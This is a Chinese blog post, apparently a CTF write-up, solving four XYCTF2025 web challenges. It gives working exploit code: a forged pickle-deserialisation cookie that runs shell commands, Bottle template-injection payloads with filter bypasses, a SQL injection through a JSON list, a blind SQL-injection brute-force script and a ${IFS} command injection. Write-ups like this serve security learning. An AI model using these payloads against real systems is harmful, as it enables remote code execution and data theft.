@@ -1,0 +1,168 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="userq"><meta name="renderer" content="webkit"><meta name="copyright" content="userq"><meta name="keywords" content="MyBlog"><meta name="description" content="MyBlog"><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>XYCTF2025_web · Mr.cheng's Blog</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicon.ico"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
+  "use strict";
+  // rel=preload support test
+  if( !w.loadCSS ){
+    w.loadCSS = function(){};
+  }
+  // define on the loadCSS obj
+  var rp = loadCSS.relpreload = {};
+  // rel=preload feature support test
+  // runs once and returns a function for compat purposes
+  rp.support = (function(){
+    var ret;
+    try {
+      ret = w.document.createElement( "link" ).relList.supports( "preload" );
+    } catch (e) {
+      ret = false;
+    }
+    return function(){
+      return ret;
+    };
+  })();
+
+  // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+  // then change that media back to its intended value on load
+  rp.bindMediaToggle = function( link ){
+    // remember existing media attr for ultimate state, or default to 'all'
+    var finalMedia = link.media || "all";
+
+    function enableStylesheet(){
+      link.media = finalMedia;
+    }
+
+    // bind load handlers to enable media
+    if( link.addEventListener ){
+      link.addEventListener( "load", enableStylesheet );
+    } else if( link.attachEvent ){
+      link.attachEvent( "onload", enableStylesheet );
+    }
+
+    // Set rel and non-applicable media type to start an async request
+    // note: timeout allows this to happen async to let rendering continue in IE
+    setTimeout(function(){
+      link.rel = "stylesheet";
+      link.media = "only x";
+    });
+    // also enable media after 3 seconds,
+    // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+    setTimeout( enableStylesheet, 3000 );
+  };
+
+  // loop through link elements in DOM
+  rp.poly = function(){
+    // double check this to prevent external calls from running
+    if( rp.support() ){
+      return;
+    }
+    var links = w.document.getElementsByTagName( "link" );
+    for( var i = 0; i < links.length; i++ ){
+      var link = links[ i ];
+      // qualify links to those with rel=preload and as=style attrs
+      if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+        // prevent rerunning on link
+        link.setAttribute( "data-loadcss", true );
+        // bind listeners to toggle media back
+        rp.bindMediaToggle( link );
+      }
+    }
+  };
+
+  // if unsupported, run the polyfill
+  if( !rp.support() ){
+    // run once at least
+    rp.poly();
+
+    // rerun poly on an interval until onload
+    var run = w.setInterval( rp.poly, 500 );
+    if( w.addEventListener ){
+      w.addEventListener( "load", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    } else if( w.attachEvent ){
+      w.attachEvent( "onload", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    }
+  }
+
+
+  // commonjs
+  if( typeof exports !== "undefined" ){
+    exports.loadCSS = loadCSS;
+  }
+  else {
+    w.loadCSS = loadCSS;
+  }
+}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="MyBlog" type="application/atom+xml">
+</head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/cat.png"></div><!--.profile-saying
+  i.fa.fa-comment
+  .saying--><div class="cxo-profile-inner"><div class="profile-name">userq</div><div class="profile-signature">for me</div><div class="friends"><div>FRIENDS</div><span><a href="//1768161086.github.io/" target="_black">friendA</a></span><span><a href="//github.com/" target="_black">friendB</a></span><span><a href="//github.com/" target="_black">friendC</a></span></div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/index-bg.png);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">Mr.cheng's Blog</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">XYCTF2025_web</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2025-04-14</span></span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><h2 id="Signin"><a href="#Signin" class="headerlink" title="Signin"></a>Signin</h2><blockquote>
+<p>来点真正的签到吧！</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"># -*- encoding: utf-8 -*-</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">@File    :   main.py</span><br><span class="line">@Time    :   2025/03/28 22:20:49</span><br><span class="line">@Author  :   LamentXU </span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">flag in /flag_&#123;uuid4&#125;</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">from bottle import Bottle, request, response, redirect, static_file, run, route</span><br><span class="line">with open(&#x27;../../secret.txt&#x27;, &#x27;r&#x27;) as f:</span><br><span class="line">    secret = f.read()</span><br><span class="line"></span><br><span class="line">app = Bottle()</span><br><span class="line">@route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    return &#x27;&#x27;&#x27;HI&#x27;&#x27;&#x27;</span><br><span class="line">@route(&#x27;/download&#x27;)</span><br><span class="line">def download():</span><br><span class="line">    name = request.query.filename</span><br><span class="line">    if &#x27;../../&#x27; in name or name.startswith(&#x27;/&#x27;) or name.startswith(&#x27;../&#x27;) or &#x27;\\&#x27; in name:</span><br><span class="line">        response.status = 403</span><br><span class="line">        return &#x27;Forbidden&#x27;</span><br><span class="line">    with open(name, &#x27;rb&#x27;) as f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    return data</span><br><span class="line"></span><br><span class="line">@route(&#x27;/secret&#x27;)</span><br><span class="line">def secret_page():</span><br><span class="line">    try:</span><br><span class="line">        session = request.get_cookie(&quot;name&quot;, secret=secret)</span><br><span class="line">        if not session or session[&quot;name&quot;] == &quot;guest&quot;:</span><br><span class="line">            session = &#123;&quot;name&quot;: &quot;guest&quot;&#125;</span><br><span class="line">            response.set_cookie(&quot;name&quot;, session, secret=secret)</span><br><span class="line">            return &#x27;Forbidden!&#x27;</span><br><span class="line">        if session[&quot;name&quot;] == &quot;admin&quot;:</span><br><span class="line">            return &#x27;The secret has been deleted!&#x27;</span><br><span class="line">    except:</span><br><span class="line">        return &quot;Error!&quot;</span><br><span class="line">run(host=&#x27;0.0.0.0&#x27;, port=8080, debug=False)</span><br></pre></td></tr></table></figure>
+
+<p>1.这里绕过读取文件的限制，<code>./../</code>相当于<code>../</code>，意义为<strong>先进入当前目录（其实就是留在原地），然后再退到上一级目录</strong></p>
+<p><code>/download?filename=./.././.././../secret.txt</code>得到<code>Hell0_H@cker_Y0u_A3r_Sm@r7</code></p>
+<p>2.下面跟<a target="_blank" rel="noopener" href="https://www.cjxol.com/posts/sekaictf-2022-writeup/">Bottle Poem</a>大致一样，<code>pickle反序列化+cookie签名</code>，不过这里<code>cookie</code>的签名用的不再是<code>md5</code>而是<code>sha256</code>，应该是出于安全性考虑</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">import hmac</span><br><span class="line">import base64</span><br><span class="line">def gen_cookie(payload):</span><br><span class="line">    b64pld = base64.b64encode(payload)</span><br><span class="line">    signature = base64.b64encode(</span><br><span class="line">        hmac.new(</span><br><span class="line">            b&quot;Hell0_H@cker_Y0u_A3r_Sm@r7&quot;, b64pld, hashlib.sha256</span><br><span class="line">        ).digest()</span><br><span class="line">    )</span><br><span class="line">    return b&#x27;&quot;!&#x27; + signature + b&quot;?&quot; + b64pld + b&#x27;&quot;&#x27;</span><br><span class="line">data = b&#x27;&#x27;&#x27;(cos</span><br><span class="line">system</span><br><span class="line">S&#x27;cat /flag_* &gt; flag&#x27;</span><br><span class="line">o.&#x27;&#x27;&#x27;</span><br><span class="line">print(gen_cookie(data).decode())</span><br></pre></td></tr></table></figure>
+
+<p>3.运行脚本后将得到的数据传入&#x2F;secret目录里，进行cookie传参name：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=!o6j+MoPMGQB9LT5wVr3HxiwMjPgI5TXTL0mVN3+C4NE=?KGNvcwpzeXN0ZW0KUydjYXQgL2ZsYWdfKiA+IGZsYWcnCm8u</span><br></pre></td></tr></table></figure>
+
+<p>4.然后通过<code>/download?filename=flag</code>路由进行下载即可</p>
+<p>5.官网wp:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from bottle import cookie_encode</span><br><span class="line">import os</span><br><span class="line">import requests</span><br><span class="line">secret = &quot;Hell0_H@cker_Y0u_A3r_Sm@r7&quot;</span><br><span class="line"></span><br><span class="line">class Test:</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return (eval, (&quot;&quot;&quot;__import__(&#x27;os&#x27;).system(&#x27;cp /f* ./2.txt&#x27;)&quot;&quot;&quot;,))</span><br><span class="line"></span><br><span class="line">exp = cookie_encode(</span><br><span class="line">    (&#x27;session&#x27;, &#123;&quot;name&quot;: [Test()]&#125;),</span><br><span class="line">    secret</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">requests.get(&#x27;http://gz.imxbt.cn:20458/secret&#x27;, cookies=&#123;&#x27;name&#x27;: exp.decode()&#125;)</span><br><span class="line"></span><br><span class="line">#访问2.txt直接打到flag。</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="ez-puzzle"><a href="#ez-puzzle" class="headerlink" title="ez_puzzle"></a>ez_puzzle</h2><p>拼图题，首先要把图片拼好</p>
+<p>既然是判断时间，那就去找关键词，搜下<code>time</code>发现了<code>startTime</code>等等，其他的不可控（比如什么<code>endTime</code>），但是如果<code>startTime</code>很大，去和2秒比较肯定没问题，所以控制台修改一下</p>
+<p>最后点击最后一块拼图即可获得flag<br>出题人又疯</p>
+<hr>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"># -*- encoding: utf-8 -*-</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">@File    :   app.py</span><br><span class="line">@Time    :   2025/03/29 15:52:17</span><br><span class="line">@Author  :   LamentXU </span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">import bottle</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">flag in /flag</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">@bottle.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    return &#x27;Hello, World!&#x27;</span><br><span class="line">@bottle.route(&#x27;/attack&#x27;)</span><br><span class="line">def attack():</span><br><span class="line">    payload = bottle.request.query.get(&#x27;payload&#x27;)</span><br><span class="line">    if payload and len(payload) &lt; 25 and &#x27;open&#x27; not in payload and &#x27;\\&#x27; not in payload:</span><br><span class="line">        return bottle.template(&#x27;hello &#x27;+payload)</span><br><span class="line">    else:</span><br><span class="line">        bottle.abort(400, &#x27;Invalid payload&#x27;)</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    bottle.run(host=&#x27;0.0.0.0&#x27;, port=5000)</span><br></pre></td></tr></table></figure>
+
+<p>1.审计源码发现&#x2F;attack上存在注入</p>
+<p>2.传入?payload&#x3D;49，结果为49,确定为SSTI</p>
+<p>3.题目要求不能使用open，并且payload长度不能大于25</p>
+<p>4.输入斜体字符来绕过：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">def replace_unquoted(text):</span><br><span class="line">    pattern = r&#x27;(\&#x27;.*?\&#x27;|\&quot;.*?\&quot;)|([oa])&#x27;</span><br><span class="line"></span><br><span class="line">    def replacement(match):</span><br><span class="line">        if match.group(1):</span><br><span class="line">            return match.group(1)</span><br><span class="line">        else:</span><br><span class="line">            char = match.group(2)</span><br><span class="line">            replacements = &#123;</span><br><span class="line">                &#x27;o&#x27;: &#x27;%ba&#x27;,</span><br><span class="line">                &#x27;a&#x27;: &#x27;%aa&#x27;,</span><br><span class="line">            &#125;</span><br><span class="line">            return replacements.get(char, char)</span><br><span class="line"></span><br><span class="line">    result = re.sub(pattern, replacement, text)</span><br><span class="line">    return result</span><br><span class="line"></span><br><span class="line">input_text = &#x27;open&#x27; # payload</span><br><span class="line">output_text = replace_unquoted(input_text)</span><br><span class="line">print(&quot;处理后的字符串:&quot;, output_text)</span><br></pre></td></tr></table></figure>
+
+<p>斜体的o被解析成了%C2%BA</p>
+<p>其实这里是一个URL解码的小坑。一个%BA就足够了。我们删除%C2即可。</p>
+<p>对字符a，同理。替换为%aa</p>
+<p>5.最终构造payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;%bapen(&#x27;/flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>6.官网wp:</p>
+<p>bottle的SSTI可以直接访问到内部类。所以易得：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &#x27;http://eci-2zeeal6ndgee1yfe98tl.cloudeci1.ichunqiu.com:5000/attack&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = &quot;__import__(&#x27;os&#x27;).system(&#x27;cat /f*&gt;123&#x27;)&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = [payload[i:i+3] for i in range(0,len(payload),3)]</span><br><span class="line">flag = True</span><br><span class="line">for i in p:</span><br><span class="line">    if flag:</span><br><span class="line">        tmp = f&#x27;\n%import os;os.a=&quot;&#123;i&#125;&quot;&#x27;</span><br><span class="line">        flag = False</span><br><span class="line">    else:</span><br><span class="line">        tmp = f&#x27;\n%import os;os.a+=&quot;&#123;i&#125;&quot;&#x27;</span><br><span class="line">    r = requests.get(url,params=&#123;&quot;payload&quot;:tmp&#125;)</span><br><span class="line"></span><br><span class="line">r = requests.get(url,params=&#123;&quot;payload&quot;:&quot;\n%import os;eval(os.a)&quot;&#125;)</span><br><span class="line">r = requests.get(url,params=&#123;&quot;payload&quot;:&quot;\n%include(&#x27;123&#x27;)&quot;&#125;).text</span><br><span class="line">print(r)</span><br></pre></td></tr></table></figure>
+
+<h2 id="Fate"><a href="#Fate" class="headerlink" title="Fate"></a>Fate</h2><p>考点：json反序列化&amp;python格式化字符串漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line">import flask</span><br><span class="line">import sqlite3</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line">def db_search(code):</span><br><span class="line">    with sqlite3.connect(&#x27;database.db&#x27;) as conn:</span><br><span class="line">        cur = conn.cursor()</span><br><span class="line">        cur.execute(f&quot;SELECT name FROM country WHERE code=UPPER(&#x27;&#123;code&#125;&#x27;)&quot;)</span><br><span class="line">        found = cur.fetchone()</span><br><span class="line">    return None if found is None else found[0]</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    return flask.render_template(&quot;index.html&quot;)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/api/search&#x27;, methods=[&#x27;POST&#x27;])</span><br><span class="line">def api_search():</span><br><span class="line">    req = flask.request.get_json()</span><br><span class="line">    if &#x27;code&#x27; not in req:</span><br><span class="line">        flask.abort(400, &quot;Empty country code&quot;)</span><br><span class="line"></span><br><span class="line">    code = req[&#x27;code&#x27;]</span><br><span class="line">    if len(code) != 2 or &quot;&#x27;&quot; in code:</span><br><span class="line">        flask.abort(400, &quot;Invalid country code&quot;)</span><br><span class="line"></span><br><span class="line">    name = db_search(code)</span><br><span class="line">    if name is None:</span><br><span class="line">        flask.abort(404, &quot;No such country&quot;)</span><br><span class="line"></span><br><span class="line">    return &#123;&#x27;name&#x27;: name&#125;</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(debug=True)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>一个拥有几乎不可能绕过的waf的SQL注入题。</p>
+<p>我们可以看到，这题是利用<code>flask.request.get_json()</code>进行传参，这个方法没有对传入的类型做检查。因此，我们可以传入非字符串类型的变量。</p>
+<p>而在python中，当我们使用f-string直接传入非字符串参数时，就会被强转为字符串。</p>
+<p>如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a=[1]</span><br><span class="line">print(f&#x27;111&#123;a&#125;&#x27;)</span><br><span class="line">输出：111[1]</span><br></pre></td></tr></table></figure>
+
+<p>这也被称为<strong>python格式化字符串漏洞</strong>。</p>
+<p>解法一：</p>
+<p>因此，这题可以这样解：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;code&quot;:[&quot;1&#x27;) UNION SELECT FLAG FROM FLAG --&quot;,&quot;1&quot;]&#125;</span><br></pre></td></tr></table></figure>
+
+<p>传入的code为列表，因而可以通过waf（len为2，没有<code>&#39;</code>元素）随后直接被f-string强转，拼入sql语句，如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT name FROM country WHERE code=UPPER(&#x27;[&quot;1&#x27;) UNION SELECT FLAG FROM FLAG --&quot;,&quot;1&quot;]&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>就可以完成一次SQL注入。拿到FLAG表里的FLAG值。</p>
+<h2 id="ezspl"><a href="#ezspl" class="headerlink" title="ezspl"></a>ezspl</h2><p>1.开局即登录，先<code>fuzz</code>看看ban了什么，发现空格、换行符、逗号，union等一堆内容被过滤了，本题主要用到两个：一是使用制表符代替空格，二是用<code>FROM</code>、<code>FOR</code>代替逗号；</p>
+<p>2.判断下注入点，过程省略了，发现是<code>username</code>为字符型注入；</p>
+<p>3.试试万能密码行不行1’%09or%091&#x3D;1%23，好消息是可以，坏消息是还有一层：</p>
+<p>提示需要输入管理员密钥</p>
+<p>4.显然还是要注入，利用布尔盲注直接爆，最后读到<code>secret: dtfrtkcc0czkoua9s</code>，输入后进入命令执行页面。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">def inject():</span><br><span class="line">    url = &#x27;http://gz.imxbt.cn:20011/login.php&#x27;</span><br><span class="line">    flag = &#x27;&#x27;</span><br><span class="line">    char = &#x27;qwertyuiopasdfghjkllzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890_&#x27;</span><br><span class="line"></span><br><span class="line">    for i in range(1, 50):</span><br><span class="line">        for j in char:</span><br><span class="line"></span><br><span class="line">            payload = f&quot;&#x27;or\tsubstr(database()from(&#123;i&#125;)for(1))=&#x27;&#123;j&#125;&#x27;#&quot;</span><br><span class="line">            # payload = f&quot;&#x27;or\tsubstr((select\tgroup_concat(table_name)from\tinformation_schema.tables\twhere\ttable_schema=&#x27;testdb&#x27;)from(&#123;i&#125;)for(1))=&#x27;&#123;j&#125;&#x27;#&quot;</span><br><span class="line">            # payload = f&quot;&#x27;or\tsubstr((select\tgroup_concat(column_name)\tfrom\tinformation_schema.columns\twhere\ttable_name=&#x27;double_check&#x27;)from(&#123;i&#125;)for(1))=&#x27;&#123;j&#125;&#x27;#&quot;</span><br><span class="line">            # payload = f&quot;&#x27;or\tsubstr((select\tgroup_concat(secret)\tfrom\tdouble_check)from(&#123;i&#125;)for(1))=&#x27;&#123;j&#125;&#x27;#&quot;</span><br><span class="line"></span><br><span class="line">            data = &#123;&quot;username&quot;: payload, &quot;password&quot;: ddd&#125;</span><br><span class="line">            r = requests.post(url=url, data=data)</span><br><span class="line">            # print(payload)</span><br><span class="line">            # print(r.text)</span><br><span class="line">            if &quot;检测到非法输入,已阻断!&quot; in r.text:</span><br><span class="line">                print(payload)</span><br><span class="line">                break</span><br><span class="line">            if &quot;帐号或密码错误&quot; not in r.text:</span><br><span class="line">                flag += j</span><br><span class="line">                print(flag)</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line">inject()</span><br></pre></td></tr></table></figure>
+
+<p>5.无回显，还把空格ban了，直接重定向：<code>cat$&#123;IFS&#125;/flag.txt$&#123;IFS&#125;&gt;flag.txt</code>，然后看文件即可。</p>
+</article><!-- lincense--><div class="license-wrapper"><p> <span>Author:  </span><a href="http://1768161086.github,io">userq</a></p><p> <span>Link:  </span><a href="http://1768161086.github,io/2025/04/14/XYCTF2025-web/">http://1768161086.github,io/2025/04/14/XYCTF2025-web/</a></p><p> <span>Copyright:  </span><span>All articles in this blog are licensed under <a rel="license noopener" target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/3.0">CC BY-NC-SA 3.0</a> unless stating additionally.</span></p></div><div class="post-paginator"><a class="prevSlogan" href="/2025/04/16/sqlmap/" title="sqlmap"><span>< PreviousPost</span><br><span class="prevTitle">sqlmap</span></a><a class="nextSlogan" href="/2025/04/05/sqlite/" title="SQLite 数据库注入总结"><span>NextPost ></span><br><span class="nextTitle">SQLite 数据库注入总结</span></a><div class="clear"></div></div><div id="comment"></div></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span> | theme </span><a target="_blank" rel="noopener" href="https://github.com/Longlongyu/hexo-theme-Cxo"><span>Cxo</span></a></p><i class="fa fa-user"> </i><span id="busuanzi_value_site_uv"></span><span> | </span><i class="fa fa-eye"> </i><span id="busuanzi_value_site_pv"></span></div></footer><!-- catelog--><div class="toc-wrapper" style="top: 70vh;"><div class="toc-catalog"><i class="fa fa-list"> </i><span>CATALOG</span></div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Signin"><span class="toc-number">1.</span> <span class="toc-text">Signin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-puzzle"><span class="toc-number">2.</span> <span class="toc-text">ez_puzzle</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fate"><span class="toc-number">3.</span> <span class="toc-text">Fate</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezspl"><span class="toc-number">4.</span> <span class="toc-text">ezspl</span></a></li></ol></div><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i></body></html>
